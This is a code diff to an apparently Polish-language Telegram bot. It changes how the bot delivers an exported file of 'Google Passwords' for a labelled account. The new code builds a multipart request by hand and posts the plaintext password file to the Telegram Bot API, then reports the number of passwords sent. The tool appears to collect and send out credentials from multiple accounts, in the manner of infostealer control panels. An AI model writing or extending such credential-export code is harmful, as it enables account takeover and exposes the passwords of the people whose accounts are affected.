@@ -582,8 +582,33 @@ async function handleGpwRows(chatId, accountId, callbackQueryId) {
     }
 
     const buf = await readFile(result.path);
-    await sendDocument(buf, result.filename, `🔐 Google Passwords: ${acc.label} (${result.count} wpisów)`);
-    await replyTo(chatId, `✅ Gotowe — plik wysłany powyżej.`);
+    // Send file — log Telegram API response for debugging
+    try {
+      const boundary = '----spBoundary' + Date.now().toString(16);
+      const parts = [];
+      const t = (s) => parts.push(Buffer.from(s, 'utf8'));
+      t(`--${boundary}\r\n`);
+      t(`Content-Disposition: form-data; name="chat_id"\r\n\r\n${chatId}\r\n`);
+      t(`--${boundary}\r\n`);
+      t(`Content-Disposition: form-data; name="caption"\r\n\r\n🔐 Google Passwords: ${acc.label} (${result.count} wpisów)\r\n`);
+      t(`--${boundary}\r\n`);
+      t(`Content-Disposition: form-data; name="document"; filename="${result.filename}"\r\n`);
+      t(`Content-Type: text/plain\r\n\r\n`);
+      parts.push(buf);
+      t(`\r\n--${boundary}--\r\n`);
+      const tgRes = await fetch(apiUrl('sendDocument'), {
+        method: 'POST',
+        headers: { 'content-type': `multipart/form-data; boundary=${boundary}` },
+        body: Buffer.concat(parts),
+      });
+      const tgData = await tgRes.json().catch(() => ({}));
+      if (!tgData.ok) {
+        await replyTo(chatId, `⚠️ Telegram odrzucił plik: ${JSON.stringify(tgData.description || tgData)}`);
+      }
+    } catch (sendErr) {
+      await replyTo(chatId, `⚠️ Błąd wysyłania pliku: ${sendErr?.message}`);
+    }
+    await replyTo(chatId, `✅ Gotowe — ${result.count} haseł.`);
   } catch (err) {
     await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
   }
